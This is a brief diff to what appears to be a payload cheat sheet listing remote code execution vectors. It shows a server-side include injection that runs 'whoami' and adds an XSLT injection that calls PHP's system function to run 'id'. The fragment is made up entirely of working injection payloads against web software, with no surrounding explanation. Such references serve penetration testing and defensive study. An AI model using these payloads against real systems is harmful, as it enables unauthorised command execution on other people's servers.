@@ -50,3 +50,9 @@ RCE
 
 RCE
 `<!--#exec cmd="whoami" -->`|
+
+XML 
+
+```xml
+<xsl:value-of select="php:function('system','id')" />
+```
